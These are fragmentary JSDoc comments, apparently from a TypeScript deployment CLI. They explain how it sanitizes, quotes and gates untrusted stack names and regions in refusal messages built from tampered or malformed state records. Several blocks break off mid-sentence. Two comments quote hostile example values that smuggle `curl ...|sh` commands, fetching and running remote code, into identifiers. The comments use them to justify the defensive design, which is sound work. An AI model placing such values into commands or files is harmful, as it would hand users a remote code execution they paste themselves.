 * Both identifiers are SANITIZED for the PROSE, and the command beside them is
 * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
 * `.claude/rules/layout-state-types.md` require of any suggestion a user is
 * meant to paste. Inside the command the RAW values go through the shared
 * gate ({@link inspectCommand}): named shell-quoted only when exact and plain,
 * a quoted hole otherwise. Two reasons that is not "sanitized, then quoted":
 *
 * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
 * printable-ASCII allowlist, so it removes the line- and escape-forgery class
 * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
 * trusted here, since a stack name reaches the cross-stack read path from an
 * `Fn::GetStackOutput` argument or an S3 key. A name spelled
 * `a'; curl http://x|sh; echo '` sanitizes to itself; unquoted it would close
 * the quoting and append its own command to the line this text tells the user
 * to RUN, and quoted its spelling is what an operator strips — which is why
 * the gate holes it rather than quoting it.
 *
 * Wrapping the command in `'...'` is not enough either, and is what makes the
 * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
 * produces something unpastable. Hence unwrapped and last.
 *
 * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` in the prose
 * rather than nothing, so the sentence names a damaged identity rather than
 * none; in the command the gate prints a hole for it, since an empty argument
 * makes `--stack-region` swallow the next flag.
 *
 * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
 * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
 * same three properties (sanitize, cap, `UNRENDERABLE` on empty) plus a
 * BOUNDARY, because its names go into a comma-joined list where a name
 * containing the delimiter forges an entry. `displayIdent` has all four —
 * JSON-quoting escapes the delimiter it adds — so that caller uses it and this
 * stays private. The pair here is not duplicated: what differs is the
 * `shellQuote` composition every message in THIS module needs and that one
 * must not have.
 *
 * The helper itself carries no `buildForceUnlockCommand`-style exactness gate,
 * which SUPPRESSES a whole command when sanitizing changed the value. The
 * difference is what the command DOES: `cdkd force-unlock` deletes another
 * process's lock, so naming a stack that is not quite the record's is
 * destructive and suppressing is right. The command most texts here end on is
 * `cdkd state show`, which reads, and since go-to-k/cdkd#3436's fold-in
 * {@link inspectCommand} builds it through the shared `pasteableCommand`
 * gate: a name sanitizing would change prints as a quoted HOLE, never as its
 * sanitized spelling (which could select a sibling record the altered name
 * happens to match) and never as nothing (which leaves a broken record with no
 * next step at all). A text that points at a command which WRITES owns the
 * gate at its own site: {@link malformedDestroyResourcesRefusalMessage} names

/**
 * The DESTROY refusal text for the `resources` bag (issue
 * [#3161](https://github.com/go-to-k/cdkd/issues/3161)).
 *
 * A SECOND `resources` refusal beside {@link malformedStateRefusalMessage},
 * for the reason every split in this module is its own: that text says saving
 * over the record "would replace the evidence with a well-formed empty one",
 * which is not what a destroy does. A destroy DELETES the record, and it does
 * so down a path the other four refusing commands never take.
 *
 * What the runner does with the bag is COUNT it —
 * `Object.keys(state.resources).length` — and route on the count. The count is
 * the list of what to delete, so an unreadable bag counts ZERO and the run
 * takes the EMPTY-STACK FAST PATH, which deletes `state.json` outright. Every
 * resource the record named stays live in AWS, now unreferenced, and the
 * destroy reports success.
 *
 * **Reading the bag as EMPTY — the read-only repair — IS that outcome rather
 * than an alternative to it**, which is why no repair is available here.
 * Measured rather than reasoned: `[]`, `5` and `true` all enumerate no keys,
 * so they already ARE the repaired-to-`{}` shape, and each one reaches the
 * fast path today. The same measurement
 * {@link refuseMalformedResourceProperties} records one container down.
 *
 * It NAMES `cdkd state orphan`, which the sibling refusals do not, and
 * that answers the objection go-to-k/cdkd#3161 raises against refusing at all
 * — that a cleanup command refusing leaves the user with no supported way to
 * tear the stack down. Proceeding would not tear anything down either, and
 * that is per-shape rather than a slogan: `[]` / a number / a boolean name no
 * resource at all, while a STRING names one fabricated logical id per
 * character whose ENTRY is a single character — so `resourceType` and
 * `physicalId` are both `undefined` and `ProviderRegistry.getProviderFor`
 * throws before any provider is selected, which means no AWS delete is issued
 * and no live resource can be addressed. (Measured 2026-09-17 against the real
 * registry: `Cannot read properties of undefined (reading 'startsWith')`, out
 * of the `isCustomResource` test — a routing failure, NOT a `provider.delete`
 * rejection, which an earlier revision of this note claimed.) What a forced
 * run would do is therefore bounded by the record: on the first three shapes
 * it deletes `state.json` and nothing else, and on a string every fabricated
 * id fails and `errorCount > 0` keeps a record — but keeps it LAUNDERED, since
 * the preserve-write spreads the bag (`{ ...state.resources }`) and `'ab'`
 * comes back as a well-formed `{"0":"a","1":"b"}`. So "it preserves the
 * evidence" would be the wrong defence of proceeding; the string shape reaches
 * the same laundering by another route, which strengthens the refusal rather
 * than weakening it (review round 2 of go-to-k/cdkd#3332). The only outcome
 * worth offering is the record's removal, and `cdkd state orphan` is the
 * supported command for it, leaving the live resources in place. It reads
 * `state.resources` nowhere, which is what makes the pointer true and is
 * fenced in `tests/unit/state/malformed-resources-bag.test.ts`.
 *
 * **That remedy is a TEMPLATE, not a substituted command, and the asymmetry
 * with the `cdkd state show` line above it is the point.** `state orphan`
 * DELETES a record; `state show` reads one. The `region` this function is
 * handed comes from `destroy-runner.ts`'s `state.region ?? ctx.baseRegion` —
 * which WAS record-body content `getState` did not check against the key it
 * loaded from, measured 2026-09-17: a record planted at
 * `.../us-east-1/state.json` carrying `"region": "eu-west-1"` rendered a
 * pasteable `cdkd state orphan <stack> --stack-region eu-west-1`, aiming a
 * destructive command at a DIFFERENT region's record for the same stack. That
 * is the misdirection class {@link stackClause} records for stack names, one
 * field over. Substituting into the read-only `state show` line is the
 * pre-existing behaviour of {@link inspectCommand} and is left alone;
 * what this lane must not add is a destructive one.
 *
 * **go-to-k/cdkd#3328 closed the BODY half of that, and the template stays
 * anyway** — the measurement above is now history, not a live repro.
 * `S3StateBackend.getState` normalizes a region-scoped record's `region` to
 * its KEY's and warns on a body that disagreed, so `state.region` reaching
 * this function is the key's region. But the key is an S3 KEY SEGMENT, which
 * is bucket-plantable in its own right (`cdkd/<stack>/<anything>/state.json`
 * lists as a region), and a legacy record still falls through to
 * `ctx.baseRegion`. So the value is still not this process's own, and a
 * DELETING command built from it is still the thing not to hand over.
 *
 * **A template is not enough on its own, because the name the reader would
 * type into it comes from the clause ABOVE.** `safeIdentifier` composes
 * `displaySafe` with a cap, and `displaySafe` TRIMS — so a planted
 * `resources["..."]` record keyed `"prod-api "` opens this message as
 * `State for 'prod-api' (...)`, byte-identical to a HEALTHY sibling spelled
 * `prod-api`. An operator who then orphans "the record the line above names"
 * deletes the intact one. That is exactly the identity failure `displayIdent`
 * exists for and {@link namedPropertyBagsClause} applies to logical ids. So
 * the remedy sentence is GATED on the identity rendering EXACTLY: when it does
 * not, the text names no removal target at all and opens on
 * {@link stackClause}'s no-identity form, ending on
 * {@link inspectCommand}'s TEMPLATE rather than on a command built from the
 * very identity it just called untrustworthy. The same call
 * `buildForceUnlockCommand` makes when a value would render misleadingly.
 *
 * **Rendering exactly is not the same as being TRUE, and the EXACT arm must
 * not claim it is.** `exact` answers a question about this message's own text;
 * it says nothing about PROVENANCE. A planted `"region": "eu-west-1"` on a
 * `.../us-east-1/` key is an ordinary region string, so it renders exactly and
 * the arm fires — and an earlier revision then said to run `cdkd state orphan`
 * "with the stack and region this message NAMES", which is the attacker's
 * region (review round 2 of go-to-k/cdkd#3332: templating had removed the
 * paste, not the aim). The arm therefore points at the record's S3 KEY, which
 * `getState` resolved and a record body cannot forge.
 *
 * Since go-to-k/cdkd#3328 the printed region IS that key's — `getState`
 * normalizes a region-scoped record's `region` to the key's region and warns
 * on a body that disagreed — so the arm no longer has to warn the reader that
 * the two may differ, and its text no longer does. It still says WHERE the
 * region comes from and still sends the reader to `cdkd state list --long` to
 * confirm the key, because a key segment is itself bucket-plantable and
 * because a LEGACY record has no key region at all, in which case the value
 * printed is the CLI's own and `--stack-region` must be omitted.
 *
 * **The VERDICT is {@link mayNameTargetWithDestructiveRemedy}** — the identifier
 * caps AND pasteability, since go-to-k/cdkd#3516 — so the stack name is
 * measured at `STACK_REF_MAX_CODE_POINTS` and the region at a region's 128,
 * which no real region approaches. Measuring the STACK at 128 instead is the
 * trap: an ordinary multi-level CDK nested child
 * (`<root>~<...NestedStackResource><hash>~<...>`, measured past 150 code
 * points) WOULD truncate there and take the withhold arm on a HEALTHY record,
 * making the fallback the common path for exactly the nested destroys this
 * lane added a guard to (review round 2 of go-to-k/cdkd#3332). The bound is
 * still a bound: a planted multi-kilobyte name is truncated at 1152 and lands
 * in the withhold arm.
 *
 * Identifiers are sanitized in the PROSE and, where a command names one,
 * gated and shell-quoted ({@link inspectCommand}, behind
 * {@link mayNameTargetWithDestructiveRemedy}), for the reasons
 * {@link safeIdentifier}'s note gives.

 * [#3328](https://github.com/go-to-k/cdkd/issues/3328), review round 1).
 *
 * **This is the one case where adopting the key is not enough, and it is a
 * consequence of adopting it rather than an argument against.**
 * `S3StateBackend.getState` replaces the body's `region` with the key's, which
 * is right for the key math, the lock and the record's own identity — cdkd
 * stamps the key's region into every body it writes, so a divergence means
 * another writer. But WHERE THE RESOURCES ARE is a different question, and a
 * divergent record is the one shape that gives two answers to it. cdkd cannot
 * tell which half is honest:
 *
 * - the BODY lies (a planted field, the misdirection this issue is about) —
 *   the resources are in the key's region and acting there is correct;
 * - the KEY lies (an `aws s3 cp` between region prefixes, a restore, a
 *   third-party writer) — the resources are in the body's region, and acting
 *   in the key's finds NOTHING.
 *
 * The second one is not a wash, it is silent data loss: `destroy-runner.ts`
 * reads a `*NotFound` from a provider as ALREADY DELETED (`deletedCount++`,
 * the row dropped from the record), so a whole stack of live resources would
 * be reported destroyed and `deleteState` would then remove the only record
 * naming them. `assertRegionMatch` — the guard that exists to stop exactly
 * that inference — cannot fire, because after normalization
 * `DeleteContext.expectedRegion` and the client region are the same value by
 * construction.
 *
 * So the refusal is narrow by design and its trigger is the CONJUNCTION:
 * divergent AND at least one resource. **A resource-less record is
 * deliberately NOT refused** — there is nothing to orphan, and that is the
 * issue's own measured repro plus the `cdkd state destroy` recovery path the
 * read-side decision exists to protect. The read path still refuses NOTHING:
 * `cdkd state show`, `cdkd state list` and `cdkd state orphan` all keep
 * working on the very record this refuses to DELETE FROM, which is what keeps
 * it fixable.
 *
 * The remedy is a TEMPLATE, never a substituted command, for the reason
 * {@link malformedDestroyResourcesRefusalMessage} records — the region reaching
 * this builder is an S3 key SEGMENT, which anyone able to write the bucket
 * chooses. (NOT "because cdkd does not know which region belongs in the flag",
 * which an earlier revision said and which is false for this flag:
 * `--stack-region` on `state orphan` selects the RECORD, and the key's region
 * is exactly that.) The body's region is not printed at all — its KIND is, the
 * bounded token {@link describeRegionValueKind} produces, for the reason
 * `getState`'s warn gives.
 *
 * And the target-naming half is GATED on both identifiers rendering EXACTLY,
 * the second half of that sibling's rule: a template is not enough on its own,
 * because the name the reader types into it comes from the clause ABOVE.

 * lives here.
 *

 * is not the module's only floor — but a floor in the SHARED helpers was tried

 *
 * Not reachable from today's callers: `cdkd state`'s sites sit below an
 * `if (!ref.region) throw`, which is falsy and so rejects `''` too, and
 * `cdkd export` normalises at its own call. What was missing is the CONTRACT —
 * a caller that hands `''` got the placeholder silently, and the guard that
 * would have caught it lived in another file.
 *
 * One cost, stated rather than discovered later: an empty STACK name with a
 * real region now drops that region from the clause and the command too, since
 * {@link inspectCommand} answers a missing stack with the two-hole template.
 * That is the existing `undefined` behaviour rather than a new rule — a record

 * It used to admit the bag on a bare `?? {}`, which covers `null` and
 * `undefined` only — so a hand-edited or truncated record whose `outputs` holds
 * a string or a list previewed the REMOVAL of outputs that never existed, one
 * row per character or element, each carrying a character of the record as its
 * `old:` side, with `cdkd diff --fail` exiting 1 on them.
 *
 * AT THE LOAD, for the reason
 * {@link repairMalformedResourcesForReadOnly}'s own note records and one more
 * that is specific to this container: `cdkd diff` dereferences the stored bag
 * BEFORE the walk that fabricates. `resolveTemplateOutputs` asks
 * `hasOwnProperty.call(storedOutputs, key)` for go-to-k/cdkd#2740's
 * skipped-output record and for go-to-k/cdkd#1942's literal `Export.Name`
 * verdict — which ANSWERS TRUE on a string for `'0'` or `'length'`, and THROWS
 * outright on `null` (`Cannot convert undefined or null to object`). So a guard
 * written at `computeOutputsDiff` alone leaves a wrong decision, or a raw
 * `TypeError`, one call above it.
 *
 * ABSENT IS EXEMPT AND `null` IS NOT, which is the one place this diverges from
 * {@link isReadableBag}'s verdict, and the split is measured rather than
 * stylistic. Both stored-bag lookups named above gate on
 * `storedOutputs !== undefined` before the `hasOwnProperty` call, so an ABSENT
 * bag never reaches one; every other consumer on the diff path carries its own
 * `?? {}` (`mergeNoChangeOutputs`'s `persisted`, `importableOutputKeys`, this
 * function's own walk). An absent bag is therefore inert, exactly the condition
 * under which `state.ts`'s `repairRenderedContainers` exempts it — and warning
 * would be a false positive on a record cdkd itself supports: `cdkd scrub`
 * round-trips a record with no `outputs` deliberately, refusing to materialize
 * `{}` over it, and the deploy's failure-path saves write
 * `outputs: currentState.outputs`, which `JSON.stringify` drops when it is
 * undefined. A `null` bag is NOT inert — it passes the `!== undefined` gate and
 * `hasOwnProperty.call(null, ...)` throws — so it is repaired and warned about
 * like any other unreadable shape.
 *
 * That leaves one clause of go-to-k/cdkd#3189's stated floor overridden on
 * purpose: it asked that a `null` bag "diff exactly as it does today and say
 * nothing", and diffing exactly as it does today means THROWING. Recorded on
 * the issue rather than silently traded.
 *
 * Mutates in place and returns whether it repaired anything; the caller warns
 * on `true` with {@link malformedOutputsWarning}. Read-only commands ONLY, for

 *
 * With NO region the flag is worse than useless, and a placeholder is the worst

 * region-prefixed key layout, so `--stack-region <region>` selects no record at
 * all whatever the operator fills in. The bare command is the correct one
 * there, because such a record is not region-partitioned.
 *
 * With no trusted STACK the whole thing degrades to a template, as the inspect
 * command does — there is nothing to substitute.
 *
 * **It diverges from {@link malformedDestroyResourcesRefusalMessage}, which
 * keeps `cdkd state orphan` a template on purpose, and the difference is where
 * the identity comes from.** That builder is reached with a REGION cdkd read
 * off the state bucket (`state.region ?? ctx.baseRegion` in
 * `destroy-runner.ts`; since go-to-k/cdkd#3328 the first operand is the S3
 * KEY's region rather than the record body's, which is a key SEGMENT and so
 * still plantable) -- its stack name is the caller's, so the region alone is
 * what would aim a destructive command using a value cdkd does not own. This
 * one is reached only with the caller's synthesized stack and
 * `pickStackRegion`'s answer, so omitting the region is the wider action. Two
 * opposite precedents in one module; neither is the general rule.
 *
 * **Substitution is GATED on the identity rendering EXACTLY, at
 * `STACK_REF_MAX_CODE_POINTS`** (go-to-k/cdkd#3360, and the M0 finding of the
 * go-to-k/cdkd#3363 review). The synthesized name is not validated: a prebuilt
 * cloud assembly's manifest reaches `cdkd orphan` unread, so a name `safeIdentifier`
 * would TRIM (`'prod-api '`) substitutes as a healthy sibling's, and one it would
 * TRUNCATE (a 166-code-point nested name at the 128 default) becomes a command
 * `cdkd state orphan` resolves to zero records and reports as a skip at exit 0.
 * Since go-to-k/cdkd#3359 the legacy shape carries no `--stack-region`, so the
 * name is the ONLY thing narrowing this DELETE. The template arm is the fallback,
 * and the caller says where to take the name from instead
 * ({@link rendersExactly} is the test, shared with the inspect line and the
 * object path).
 *
 * `recovery` qualifies EVERY arm, the no-identity template included, the way
 * {@link buildForceUnlockCommand} is qualified, through the same `recoveryCommandFlags`: `cdkd state orphan`
 * re-resolves the bucket from the ambient profile, so a remedy pasted after
 * `cdkd orphan --profile prod ...` would otherwise address the default
 * profile's account. The template keeps them too: the identity is the hole,
 * not the account, and an operator who fills only the hole would otherwise run
 * an UNQUALIFIED delete — which `cdkd state orphan` reports as a skip at exit 0

 * The logical ids whose resource record carries a `properties` bag that cannot
 * be read as a map (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * A THIRD container, on the ENTRY rather than on the record root, and it is a
 * separate predicate from {@link hasReadableResources} for the reason every
 * split in this module is: the CONSEQUENCE differs. An unreadable `resources`
 * map reads as an empty STACK; an unreadable `properties` bag reads as a
 * resource whose every declared property is MISSING, which
 * `src/analyzer/diff-calculator.ts` turns into a property-change set and, for
 * a create-only property, into a REPLACEMENT of the live resource.
 *
 * `undefined` is NOT exempt here, unlike in {@link hasReadableOutputs}. That
 * exemption exists because cdkd itself writes records with no `outputs` key —
 * `JSON.stringify` drops an `undefined` field on the deploy's failure-path
 * saves. Nothing writes a resource record with no `properties`: every writer
 * in `src/` assigns an object (`cdkd import` spells it `Properties ?? {}`),
 * `JSON.stringify` never drops a `{}`, and the field is REQUIRED by
 * `ResourceState`. An absent bag is therefore a hand edit or a truncation, and
 * it is one of the two shapes that used to die on a bare `TypeError` naming no
 * stack, no key and no remedy (`Cannot convert undefined or null to object`).
 *
 * An entry that is not a readable OBJECT is SKIPPED rather than named: a `null`
 * entry has no `properties` to test, and reading one off a string entry would
 * name a per-character defect that is really the entry's. That makes this
 * verdict independent of {@link unreadableResourceEntries} for every entry
 * that is not an object — but NOT for an object with no `resourceType` whose
 * `properties` map is also unreadable, which both predicates name. A read-only caller that takes both therefore drops
 * entries FIRST ({@link repairMalformedResourceEntriesForReadOnly}), so the
 * row is reported once, as unreadable, rather than warned about as a preview
 * and then dropped. The object test stays here rather than
 * {@link isReadableResourceEntry} so this verdict does not depend on the entry
 * guard running first: narrowing it would let a typeless object with a torn
 * map through any caller that takes this predicate alone. Likewise a `resources` bag that is not readable at all
 * yields `[]` here rather than ids invented from a string's characters — that
 * class is {@link hasReadableResources}'s to report. What a caller must not do
 * is take only this one.

 * naming the resources whose `properties` bag could not be read (issue
 * [#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * **REFUSE, and repairing to `{}` is not the safe alternative here — it is the
 * SAME outcome.** That is the measurement the issue asked for, and it is what
 * settles the contract rather than the write-capable rule alone. Driven
 * through the real `DiffCalculator` against an `AWS::S3::Bucket` declaring
 * `BucketName`, a stored `properties` of `"abcdef"`, `[]` and `5` each
 * produced a property change carrying `requiresReplacement: true` — and `[]`
 * and `5` enumerate no keys, so they ARE the repaired-to-empty case. A repair
 * would launder a torn record into a silent REPLACE of a live resource, which
 * is the data loss the guard exists to prevent; only a refusal closes it.
 *
 * The cost is stated rather than argued away: a deploy over ONE torn record
 * aborts the whole run, including the stacks and resources that are fine.
 * That is the right trade against replacing a resource nobody asked to
 * replace, and it is paid before anything irreversible: the refusal is raised
 * from the diff, so nothing is provisioned and no state is written for the
 * stack, and the deploy's lock is released by its own `finally`. NOT "before
 * any provider call" — that claim is false and was corrected in review:
 * `DeployEngine.kickOffAutoRefreshObservedProperties` fires fire-and-forget
 * `provider.readCurrentState` READS earlier in the same run. They persist
 * nothing, because the save they would be drained into never happens.
 *
 * The identity in the message is the CALLER's, never the record's — see
 * {@link stackClause}, where an absent identity is the honest case rather than
 * a degraded one.
 *
 * Deliberately NOT folded into {@link refuseMalformedState}, for the reason
 * {@link unreadableResourcePropertyBags} gives: that predicate answers a
 * question about the record ROOT, and its callers have each had to make their
 * own decision about this one. `cdkd rollback` replays a journal rather than
 * diffing, so an unrelated broken bag would stop the command documented as the
 * way to UNWIND a stack whose state is already suspect; `cdkd scrub` and
 * `cdkd import` do not compare properties at all.
 *
 * **The rule is OPT-IN PER CALLER, not "whoever COMPARES the bag"**, and an
 * earlier revision of this sentence said the latter — which go-to-k/cdkd#3318
 * falsified within two lanes. `cdkd orphan` compares nothing and still opts in
 * through {@link refuseMalformedResourcePropertiesForOrphan}, because it SAVES
 * the bag; what each caller owes is an answer to "what would I do with a map I
 * cannot read", and comparison is only one way to owe one. Do not read this
 * paragraph as licence to delete a call from a caller that does not diff.

 *
 * **The LOGICAL IDS take `displayIdent` instead, and NOT `shellQuote`** — the
 * answer {@link safeIdentifier}'s note already prescribes for names in a
 * `', '`-joined list, applied one level down. The three properties that matters
 * for, in the order they bite:
 *
 * 1. **IDENTITY.** `displaySafe` TRIMS, so a sanitize-and-quote pair renders
 *    `"Bucket "`, `" Bucket"` and `"Bucket\t"` byte-identically to a HEALTHY
 *    sibling key spelled `Bucket`. Plant a torn `resources["Bucket "]` beside a
 *    real `Bucket` and the refusal names the intact record: the operator opens
 *    it, finds nothing wrong, and concludes cdkd is the broken party while the
 *    damaged entry goes unnamed. That is the same misdirection go-to-k/cdkd#3164
 *    closed for stack names and the review of go-to-k/cdkd#3191 closed for this
 *    module's identity clause. `displayIdent` compares the sanitized text
 *    against the raw one and JSON-quotes whenever they differ, so a padded id
 *    can never render bare.
 * 2. **BOUNDARY.** JSON-quoting escapes the `'` an id spelled
 *    `x' Inspect it with: curl evil.sh|sh #` would otherwise use to plant a
 *    forged remedy ahead of the real one, on a line that ends in a pasteable
 *    command. It also supplies the quotes the old `shellQuote` wrapper added —
 *    which is why the wrapper GOES rather than composing, per the same note.
 * 3. **TRUNCATION.** `[cut: N more characters withheld]` cannot be mistaken for
 *    content, where the old `...` tail was indistinguishable from a legitimate
 *    id ending `Prod...`.
 *
 * The cap is passed EXPLICITLY although it equals the default: a logical id is
 * valid up to `IDENT_MAX_CODE_POINTS` — the cap {@link displayLogicalId} also
 * takes — and a region-sized cut would truncate a legitimate long id into one
 * naming no record. Spelling the cap keeps that decision visible at the site it
 * was made for.
 *
 * Known residual, NOT introduced here: `,` is in `PLAIN_IDENT`, so an id
 * carrying one still renders bare inside this `', '`-joined list and reads as
 * two entries — the joined-list ambiguity recorded on go-to-k/cdkd#3179 for
 * every caller of the helper, not a property of this one.
 *
 * NAMED rather than listed in full: a record whose 500 resources were all
 * hand-edited must not push the remedy command off the reader's screen.
 *
 * REFUSES an empty list rather than rendering `holds 0 resource record(s) — —`.

/**
 * The `cdkd orphan` refusal text for the per-entry `properties` container
 * (issue [#3318](https://github.com/go-to-k/cdkd/issues/3318)).
 *
 * A SECOND `properties` refusal beside
 * {@link malformedResourcePropertiesRefusalMessage}, for the reason every
 * split in this module is its own: that text describes the DIFF's verdict —
 * "a DELETE and re-create of resources the template did not change" — which
 * `cdkd orphan` never computes. It runs no diff at all.
 *
 * **And the harm here is NOT the laundering the module's other write-capable
 * refusals describe.** Measured 2026-09-17 through the real
 * `rewriteResourceReferences` over an `AWS::S3::Bucket` record: `rewriteValue`
 * returns a non-object verbatim, so a stored `"abcdef"` comes back as
 * `"abcdef"`, a `5` as `5`, a `null` as `null`, and an ABSENT bag stays absent
 * once `JSON.stringify` drops it. Nothing is fabricated and no evidence is
 * replaced — so {@link malformedOutputsRefusalMessage}'s "saved back as a
 * well-formed six-key map" sentence, true one container over, would be FALSE
 * here and must not be borrowed.
 *
 * What it DOES share is {@link namedPropertyBagsClause}, which carries a
 * diff-shaped sentence of its own ("a create-only property among them is a
 * REPLACEMENT of the live resource"). That is not a contradiction and is not
 * an oversight: the shared clause describes what the RECORD is, and the reason
 * an operator must care is precisely that a later `cdkd deploy` / `cdkd diff`
 * reaches that verdict. What this text must not do — and what its fence pins —
 * is claim that verdict as its OWN, since `cdkd orphan` computes no diff.
 *
 * What IS at stake is the command's own job. `cdkd orphan` exists to leave the
 * record deployable: it rewrites every surviving sibling's `Ref` /
 * `Fn::GetAtt` / `Fn::Sub` reference to an orphan so the next deploy neither
 * re-creates the orphan nor fails on a stale reference. Over a map it cannot
 * read it cannot do that and cannot say it did not. A scalar bag presents no
 * reference to find, so the `--force`-less hard fail on unresolvable
 * references can never fire for one; a LIST bag is the one unreadable shape
 * `rewriteValue` DOES walk (measured: a stored `[{"Ref":"<orphan>"}]` came
 * back as `["<physicalId>"]` with one row in the audit table), so its rewrites
 * are reported into a container that is still not a map. Either way the
 * command takes a lock, saves, and reports success over a record left in
 * exactly the state `cdkd deploy` REFUSES
 * ({@link malformedResourcePropertiesRefusalMessage}) and `cdkd diff` previews
 * as a replacement — one command after the evidence was last in cdkd's hands.
 *
 * **The refusal is SCOPED to the records the save would KEEP, so orphaning the
 * DAMAGED record itself still works** —
 * {@link refuseMalformedResourcePropertiesForOrphan} is handed the ids being
 * removed and never names one. Compare
 * `malformedDestroyResourcesRefusalMessage`, which has to point at a different
 * COMMAND for its way out because a destroy keeps every record it reads.
 *
 * **But that in-command way out is CONDITIONAL, and the text must say so.**
 * `cdkd orphan` addresses resources only through the `aws:cdk:path` index of
 * the SYNTHESIZED template (`resolveConstructPaths` →
 * `buildCdkPathIndex`), so an id the CDK app no longer declares — a record
 * left behind when the construct was deleted, or one a hand edit invented —
 * can never enter the orphan set for ANY invocation. The exemption therefore
 * cannot reach it, and an earlier revision of this text nonetheless told the
 * operator to "orphan the damaged record ITSELF" unconditionally: an
 * instruction that dies on `Construct path '...' not found in template`, which
 * is the misstating-the-remedy class this module's own notes record (security
 * review of go-to-k/cdkd#3318). The remedy is now stated with its condition and
 * the two unconditional ways out beside it — hand repair, and
 * `cdkd state orphan <stack>`, which needs no CDK app and drops the whole
 * record with the live resources left standing.
 *
 * So the recovery-path objection is answered for the common case by the
 * exemption and for the rest by naming commands that do not depend on the
 * template. What this does NOT claim is that `cdkd orphan` stays usable on a
 * stack holding a template-less torn record: it does not, exactly as
 * `cdkd deploy` does not (go-to-k/cdkd#3191). A state-keyed escape hatch
 * (`--orphan-logical-id`, addressing a record by its state key rather than by
 * a construct path) was considered in the same review and DECLINED: it is a new
 * mutating CLI surface whose only job is to route around a record the operator
 * must repair or drop anyway, and `cdkd state orphan <stack>` already removes
 * such a record with no CDK app and no new flag.
 *
 * It must be true under `--dry-run` as well, and it is: the guard sits at the
 * load, far above the `if (options.dryRun)` return. Refusing there is
 * {@link malformedResourcePropertiesRefusalMessage}'s call for the same
 * reason — a plausible rewrite audit table followed by a refusal the moment
 * the flag comes off is the worst arm of all.
 *
 * `rawStackName` / `rawRegion` are the CALLER's resolved identity — the synthesized
 * stack name and the region `pickStackRegion` settled on, never the record's
 * own unvalidated self-report (though an assembly-supplied stack name is not

 *
 * A KNOWN stack with NO region is a legacy record (`<prefix>/<stack>/state.json`)
 * that `listStacks` lists with no region — `cdkd orphan` hands this module the
 * region the record is LISTED under since go-to-k/cdkd#3359, and that is
 * `undefined` only for such a ref (its body names no region, or the probe that
 * reads it could not). `cdkd state show` refuses such a record with or without
 * `--stack-region` ("has only a legacy state record without a region"), and the
 * migration it suggests is a `cdkd deploy`, which refuses this very record
 * (go-to-k/cdkd#3191). So ending on `cdkd state show` would hand the operator a
 * command that cannot serve them; the line names the S3 object instead. Teaching
 * `state show` to read a legacy record was the alternative, declined as a wider
 * change to a command that is not the one refusing.
 *
 * The object path is printed only when the stack name {@link rendersExactly}: a
 * path with a sanitized or truncated segment names an object that does not
 * exist. The name comes from the assembly, and `cdkd orphan` accepts a PREBUILT
 * one whose manifest nothing validates, which is what makes an inexact name
 * reachable at all (go-to-k/cdkd#3360); an S3 key's `Parent~Child` name, the
 * case the destroy refusal's gate was written for, cannot appear here.
 *
 * With `recovery` the path carries the REAL prefix and names the bucket, the
 * way the drop remedy above it is qualified; without it the prefix is a
 * placeholder and the sentence says how to fill it.
 *
 * Its region-less arm is also {@link inspectTail}'s, for the state and outputs

 * {@link refuseMalformedOrphansForOrphan} for `state.orphans[]`, which the
 * rewrite spreads through `carriedState` without reading (go-to-k/cdkd#3344).
 * This scan skips an entry that is not an object, which is why the first of
 * them has to exist: its "carried through VERBATIM" sentence is true of the
 * container it scans and false of the one above it.
 *
 * CALL IT AT THE LOAD, beside {@link refuseMalformedState} and
 * {@link refuseMalformedOutputs}, above `rewriteResourceReferences` — the

 * answers through its own entry point on this class,

 * unsupported`; `N resources checked`) with the corrupt entries invisible and
 * then save the record back, so the ONE thing the user could have acted on
 * would be the thing the run did not say. Naming them costs nothing a skip
 * would have preserved either: both refusals happen before this stack's lock
 * and before any AWS read of it, so no partial work on it is thrown away.
 *
 * PER STACK, which is why the message says so — and the callers reach a
 * multi-stack refusal differently. `cdkd state refresh-observed` checks every
 * target's shape before it saves any, so a record ALREADY malformed stops the
 * run before a write; only one edited between that check and its own refresh
 * reaches this call after the stacks ahead of it were saved. `cdkd drift --all`
 * collects every stack's report before either writer runs. The message cannot
 * tell which case it is in, so it claims only what holds for both.
 *
 * That is not an argument that a skip is always wrong — the read-only twin

 * {@link deployRefusesPropertiesReason}'s count-only line in that file. It keeps
 * the names even though {@link malformedOrphanRowsKeptWarning} now names them
 * too: this reason ships in the `--json` payload, where "see the warning above"
 * has no referent — the same argument that sibling's doc makes for its own

/**
 * The WARNING `cdkd diff` prints for an `orphans` row it KEEPS and a writer
 * refuses (go-to-k/cdkd#3641 maintainer round 2, M1 continued).
 *
 * At every node the RUN REACHES with an adoption preview, which is narrower than
 * "every node" and the difference is not pedantry (round 4): a non-recursive run —
 * the default — returns before visiting any child, a state-only child being
 * DELETED is built with no `previewOrphanAdoption` so the whole row pass is
 * skipped, and any other caller omitting that option skips it too.
 *
 * The exit-3 reason beside this one is TOP-LEVEL only, which is
 * go-to-k/cdkd#3335's scope decision and right: the deploy skips an unchanged
 * nested-stack row, so a reason there would report a refusal over a deploy that
 * succeeds. What made that split SAFE for every other class is that each one
 * still warns at every node — and this class had no warning at all, because the
 * row is KEPT and {@link malformedOrphanRecordsWarning} speaks only for rows that
 * were DROPPED. So a changed nested child holding such a row printed nothing and
 * its deploy refused.
 *
 * It says what the row IS and what the deploy will do, and makes no claim about
 * what else happens to the row — which is where the first two spellings went
 * wrong (go-to-k/cdkd#3641 rounds 3 and 4). One said the map "is repaired and
 * named again over the records an adoption takes", false for every row that
 * survives the caller's subtraction; the next said nothing else repairs or
 * previews these rows, false for an ADOPTED row whose `properties` are healthy and
 * whose `attributes` are torn — the subtraction removes adopted torn-`properties`
 * names, not every adopted row, and `planOrphanAdoption` rebuilds that row's
 * attributes and previews the adopted resource. The row's disposition beyond
 * "kept" is the caller's business, not this sentence's.
 *
 * It says the deploy of THIS stack refuses, not that "the deploy this previews"
 * will not start (round 4 again): under `--recursive` this warning can name a row
